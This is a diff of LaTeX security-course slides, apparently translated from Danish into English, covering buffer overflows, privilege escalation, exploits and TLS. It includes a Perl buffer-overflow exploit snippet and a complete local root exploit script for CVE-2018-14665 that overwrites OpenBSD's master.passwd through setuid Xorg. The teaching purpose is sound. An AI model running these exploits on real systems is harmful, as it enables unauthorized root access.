@@ -308,7 +308,8 @@ Eftir Mark Graff, Kenneth R. Van Wyk, June 2009
 \end{list1}
 
 
-\slide{Teknisk hvad er hacking}
+
+\slide{Technically what is hacking}
 
 \hlkimage{12cm}{buffer-overflow-3.pdf}
 
@@ -317,44 +318,43 @@ Eftir Mark Graff, Kenneth R. Van Wyk, June 2009
 \slide{Trinity breaking in}
 
 \hlkimage{14cm}{trinity-nmapscreen-hd-cropscale-418x250.jpg}
-Meget realistisk - sådan foregår det næsten:\\
+Very realistic -- comparable to hacking:\\
 \link{https://nmap.org/movies/}\\
 \link{https://youtu.be/51lGCTgqE_w}
 
 
 
-\slide{Hacking er magi}
+\slide{Hacking is magic}
 
 \hlkimage{5cm}{wizard_in_blue_hat.png}
 
 \vskip 1 cm
 
-\centerline{Hacking ligner indimellem  magi}
+\centerline{Hacking looks like magic}
 
 
-\slide{Hacking er ikke magi}
+\slide{Hacking is not magic}
 
 \hlkimage{15cm}{ninjas.png}
 
 \vskip 1 cm
-\centerline{Hacking kræver blot lidt ninja-træning}
+\centerline{Hacking only demands ninja training and knowledge others don't have}
 
 
 
-\slide{Buffer overflows et C problem}
+
+
+\slide{Buffer overflows a C problem}
 
 \begin{list1}
-\item {\bfseries Et buffer overflow}
-er det der sker når man skriver flere data end der er afsat plads til
-i en buffer, et dataområde. Typisk vil programmet gå ned, men i visse
-tilfælde kan en angriber overskrive returadresser for funktionskald og
-overtage kontrollen.
-\item {\bfseries Stack protection}
-er et udtryk for de systemer der ved hjælp af operativsystemer,
-programbiblioteker og lign. beskytter stakken med returadresser og
-andre variable mod overskrivning gennem buffer overflows. StackGuard
-og Propolice er nogle af de mest kendte.
+\item {\bfseries A buffer overflow} is what happens when writing more data than allocated in some area of memory. Typically the program will crash, but under ce
+rtain circumstances an attacker can write structures allowing take over of return addresses, parameters for system calls or program execution.
+\item {\bfseries Stack protection} is today used as a generic term for multiple technologies used in operating systems, libraries, compilers etc. that protect t
+he stack and other structures from being overwritten or changed through buffer overflows. StackGuard
+and Propolice are examples of this.
 \end{list1}
+
+Today we will not go more into detail about this, suffice it to say modern operating systems really employ a lot of methods for making buffer overflows harder and less likely to succeed. OpenBSD even relink the kernel on installation to randomize addresses.
 
 \slide{Buffers and stacks, simplified}
 
@@ -368,6 +368,8 @@ main(int argc, char **argv)
 }
 \end{minted}
 
+
+
 \slide{Overflow -- segmentation fault}
 
 \hlkimage{18cm}{buffer-overflow-2.pdf}
@@ -380,80 +382,100 @@ main(int argc, char **argv)
 \end{list2}
 
 
-\slide{Exploits -- udnyttelse af sårbarheder}
 
-\begin{list2}
-\item Exploit/exploitprogram er udnytter en sårbarhed rettet mod et specifikt system.
-\item Kan være 5 linier eller flere sider ofte Perl, Python eller et C program
-\end{list2}
+\slide{Exploits -- abusing a vulnerability}
 
-Eksempel demo i Perl, uddrag:
-\begin{minted}[fontsize=\footnotesize]{perl}
+\begin{alltt}\footnotesize
 $buffer = "";
-$null = "\x00";
-$nop = "\x90";
+$null = "\textbackslash{}x00";
+$nop = "\textbackslash{}x90";
 $nopsize = 1;
 $len = 201; // what is needed to overflow, maybe 201, maybe more!
 $the_shell_pointer = 0x01101d48; // address where shellcode is
 # Fill buffer
-for ($i = 1; $i < $len;$i += $nopsize) {
+for ($i = 1; $i < $len;$i += $nopsize) \{
     $buffer .= $nop;
-}
+\}
 $address = pack('l', $the_shell_pointer);
 $buffer .= $address;
 exec "$program", "$buffer";
-\end{minted}
+\end{alltt}
 
+\begin{list2}
+\item Exploit/exploit program are designed to exploit a specific vulnerability, often a specific version on a specific release on a specific CPU architecture
+\item Might be a 5 line program written in Perl, Python or a C program
+\item Today we often see them as modules written for Metasploit allowing it to be combined with different payloads
+\end{list2}
 
-\slide{Hvordan finder man buffer overflow, og andre fejl}
+\slide{How to find these buffer overflows }
 
 \begin{list1}
 \item Black box testing
 \item Closed source reverse engineering
 \item White box testing
-\item Open source betyder man kan læse og analysere koden
-\item Source code review -- automatisk eller manuelt
-\item Fejl kan findes ved at prøve sig frem -- fuzzing
-\item Exploits virker typisk mod specifikke versioner af software
+\item Open source read and analyze the code -- tools exist
+\item Trial and error -- fuzzing inputs to a program, save crashes, analyze them
+\item Reverse engineer specific updates, so this part was changed, nice -- this is where the bug is
 \end{list1}
 
 
-\slide{Privilegier privilege escalation}
+\slide{Principle of Least Privilege}
+
 \begin{list1}
-\item {\bfseries Privilege escalation} er når man på en eller anden vis
-opnår højere privileger på et system, eksempelvis som
-følge af fejl i programmer der afvikles med højere
-privilegier. Derfor HTTPD servere på Unix afvikles som
-nobody -- ingen specielle rettigheder.
-\item En angriber der kan afvikle vilkårlige kommandoer kan ofte finde
-  en sårbarhed som kan udnyttes lokalt -- få rettigheder = lille skade
+\item Many programs need privileges to perform some function, but sometimes they don't really need it
+\item {\bf Definition 14-1} The \emph{principle of least privilege} states that a subject should be given only those privileges that it needs in order to complete the task.\\
+Source:  \emph{Computer Security: Art and Science}, 2nd edition, Matt Bishop
+
+\item Also drop privileges when not needed anymore, relinquish rights immediately
+\item Example, need to read a document - but not write.
+\item Database systems can often provide very fine grained access to data
 \end{list1}
 
-Eksempel: man finder exploit som giver kommandolinieadgang til et system
-som almindelig bruger
-
-Ved at bruge en local exploit, Linuxkernen kan man måske forårsage fejl
-og opnå root, GNU Screen med SUID bit eksempelvis
+\slide{Privilege Escalation}
+\begin{list1}
+\item {\bfseries Privilege escalation} is when a privileged program is vulnerable and can be abused to escalate privileges. Example from unauthenticated user to a user account, or from regular user and becoming administrator (root on Unix) or even SYSTEM on Windows.
+\item Kernels and drivers are also often susceptible to this
+\end{list1}
 
 
 \slide{Local vs. remote exploits}
 
 \begin{list1}
-\item {\bfseries Local vs. remote}
-angiver om et exploit er rettet mod
-en sårbarhed lokalt på maskinen, eksempelvis
-opnå højere privilegier, eller beregnet
-til at udnytter sårbarheder over netværk
+\item {\bfseries Local vs. remote} exploit describe if the attack is done over some network, or locally on a system
 \item {\bfseries Remote root exploit}
-- den type man frygter mest, idet
-det er et exploit program der når det afvikles giver
-angriberen fuld kontrol, root user er administrator
-på Unix, over netværket.
-\item {\bfseries Zero-day exploits} dem som ikke offentliggøres -- dem
-  som hackere holder for sig selv. Dag 0 henviser til at ingen kender
-  til dem før de offentliggøres og ofte er der umiddelbart ingen
-  rettelser til de sårbarheder
+are the worst kind, since they work over the network, and gives complete control aka root on Unix
+\item {\bfseries Zero-day exploits} is a term used for those exploits that suddenly pop up, without previous warning. Often found during incident response at some network. We prefer that security researchers that discover a vulnerability uses a {\bf responsible disclosure} process that involves the vendor .
 \end{list1}
+
+\slide{CVE-2018-14665 Multiple Local Privilege Escalation}
+
+\begin{alltt}\footnotesize
+#!/bin/sh
+# local privilege escalation in X11 currently
+# unpatched in OpenBSD 6.4 stable - exploit
+# uses cve-2018-14665 to overwrite files as root.
+# Impacts Xorg 1.19.0 - 1.20.2 which ships setuid
+# and vulnerable in default OpenBSD.
+# - https://hacker.house
+echo [+] OpenBSD 6.4-stable local root exploit
+cd /etc
+Xorg -fp 'root:$2b$08$As7rA9IO2lsfSyb7OkESWueQFzgbDfCXw0JXjjYszKa8Aklt5RTSG:0:0:daemon:0:0:Charlie &:/root:/bin/ksh'
+ -logfile master.passwd :1 &
+sleep 5
+pkill Xorg
+echo [-] dont forget to mv and chmod /etc/master.passwd.old back
+echo [+] type 'Password1' and hit enter for root
+su -
+\end{alltt}
+Code from: \url{https://weeraman.com/x-org-security-vulnerability-cve-2018-14665-f97f9ebe91b3}
+
+\begin{list2}
+\item The X.Org project provides an open source implementation of the X Window System. X.Org security advisory: October 25, 2018
+\url{https://lists.x.org/archives/xorg-announce/2018-October/002927.html}
+
+%\item Example exploit method, write cron job - wait for shell:\\
+%\url{https://www.exploit-db.com/exploits/45742}
+\end{list2}
 
 
 
@@ -504,40 +526,34 @@ NOTE: this demo is using the dash shell, not bash - since bash drops privileges 
 \slide{GDB GNU Debugger}
 
 \begin{list1}
-\item GNU compileren og debuggeren fungerer ok, men check andre!
-\item Prøv \verb+gdb ./demo+ og kør derefter programmet fra \emph{gdb prompten}
-med  \verb+run 1234+
-\item Når I således ved hvor lang strengen skal være kan I fortsætte
-  med \verb+nm+ kommandoen -- til at finde adressen på
-  \verb+the_shell+\\
-Skriv \verb+nm demo | grep shell+
-
-\item Kunsten er således at generere en streng der er præcist så lang
-  at man får lagt denne adresse ind på det \emph{rigtige sted}.
-\item Perl kan erstatte AAAAA således \verb+`perl -e "print 'A'x10"`+
+\item GNU compileren and debugger are OK for this, can fit on a slide!
+\item Lots of other debuggers exist
+\item Try \verb+gdb ./demo+ and run the program with some input from the \emph{gdb prompt}
+using \verb+run 1234+
+\item When you realize the input overflows the buffer, crashed program execution you can work towards getting the address from \verb+nm demo+ of the function \verb+the_shell+
+   -- and into the program
+\item Use: \verb+nm demo | grep shell+
+\item The art is to generate a string long enough to overflow, and having the correct data, so the address ends up in the right place
+\item Perl can be used for generating AA...AAA like this, \\
+with back ticks, \verb+`perl -e "print 'A'x10"`+
 \end{list1}
 
 
-\slide{Debugging af C med GDB}
+
+\slide{Debugging C with GDB}
 
 \begin{list1}
-\item Vi laver sammen en session med GDB
-\item Afprøvning med diverse input
+\item Test with input
 \begin{list2}
-\item \verb+./demo langstrengsomgiverproblemerforprogrammethvorformon+
-\item \verb+gdb demo+ efterfulgt af run med parametre\\
+\item \verb+./demo longstringwithalotofdatyacrashtheprogram+
+\item \verb+gdb demo+ followed by\\
 \verb+run AAAAAAAAAAAAAAAAAAAAAAAAAAAAA+
+
+\item Compile program: \verb+gcc -o demo demo.c+
+\item Run program \verb+./demo 123456...7689+ until it dies
+\item Then retry in GDB
 \end{list2}
 \end{list1}
-
-{\bfseries Hjælp:}\\
-Kompiler programmet og kald det fra kommandolinien med
-\verb+./demo 123456...7689+ indtil det dør ... derefter prøver I det
-samme i GDB
-
-Hvad sker der? Avancerede brugere kan ændre
-\verb+strcpy+ til \verb+strncpy+
-
 
 \slide{GDB output}
 
@@ -590,6 +606,21 @@ Program received signal SIGSEGV, Segmentation fault.
 
 
 
+\slide{Basic cryptography}
+
+{~}
+\hlkrightpic{9cm}{-1cm}{mitm-2019.png}
+
+\begin{list2}
+\item Confidentiality - data ket secret from prying eyes
+\item Integrity - data is not changed by unauthorized programs pr people
+\item A common attack category is children intercepting messages
+\item often called MiTM (Man in the middle) -- Mini in the Middle in this case
+\end{list2}
+
+
+
+
 \slide{WEP design major cryptographic errors}
 
 \begin{list1}
@@ -601,6 +632,8 @@ Program received signal SIGSEGV, Segmentation fault.
 Source:
 \emph{Secure Coding: Principles and Practices}, Mark G. Graff
 and Kenneth R. van Wyk, O'Reilly, 2003
+
+Example of a technology that people depended upon, \link{https://en.wikipedia.org/wiki/Wired_Equivalent_Privacy}
 
 
 \slide{Poor Use of Cryptography}
@@ -620,19 +653,6 @@ Cryptography is hard!
  \url{https://toc.cryptobook.us/}\\ \url{https://crypto.stanford.edu/~dabo/cryptobook/BonehShoup_0_4.pdf}
 \end{list1}
 
-\slide{Github Public passwords?}
-
-\hlkimage{13cm}{github-credentials.png}
-
- Sources:\\
-{\footnotesize\link{https://twitter.com/brianaker/status/294228373377515522}\\
-\link{http://www.webmonkey.com/2013/01/users-scramble-as-github-search-exposes-passwords-security-details/}\\
-\link{http://www.leakedin.com/}\\
-\link{http://www.offensive-security.com/community-projects/google-hacking-database/}
-}
-
-\vskip 5mm
-\centerline{Use different passwords for different sites, yes - every site!}
 
 
 
@@ -842,40 +862,26 @@ Elliptic-curve cryptography (ECC) is an approach to public-key cryptography base
 
 
 
+
 \slide{Transport Layer Security (TLS)}
 
 \hlkimage{5cm}{crypto-class.png}
 
 \begin{list1}
-\item Oprindeligt udviklet af Netscape Communications Inc.
-\item Secure Sockets Layer SSL er idag blevet adopteret af IETF og kaldes
-derfor også for Transport Layer Security TLS
-TLS er baseret på SSL Version 3.0
-\item RFC-2246 The TLS Protocol Version 1.0 fra Januar 1999
-\item RFC-3207 SMTP STARTTLS
-\item Det er svært!
-\item Stanford Dan Boneh udgiver en masse omkring crypto\\ \link{https://crypto.stanford.edu/~dabo/cryptobook/}
+\item Originally from Netscape Communications Inc.
+\item Secure Sockets Layer (SSL) was adopted by the IETF newer versions are called
+Transport Layer Security (TLS)
+\item TLS 1.0 based on generalized version of SSL Version 3.0
+\item RFC-2246 The TLS Protocol Version 1.0 from Januar 1999
+\item RFC-3207 SMTP STARTTLS allows the use of TLS with SMTP mail protocols
+\item Today most sites and servers support TLS Server Name Indication (SNI) name based certificates
 \end{list1}
 
-\slide{TLS Server Name Indication extension}
-
-HTTPS skal der til!
-
-\hlkimage{5cm}{Encrypt_all_the_things.png}
-
-
-Vi skal kryptere, men desværre så skjuler vores HTTPS ikke hvad site vi tilgår.
-
-\begin{list2}
-\item HTTPS er idag TLS Transport Layer Security
-\item Verifikation sker med certifikater der præsenteres af server
-\item Der kan være flere sites på en enkelt IP - med SNI
-\item Desværre vælges det rigtige certifikat før krypteringen starter
-\end{list2}
 
 \slide{TLS Server Name Indication example}
 
 \hlkimage{12cm}{wireshark-sni-twitter.png}
+
 
 
 
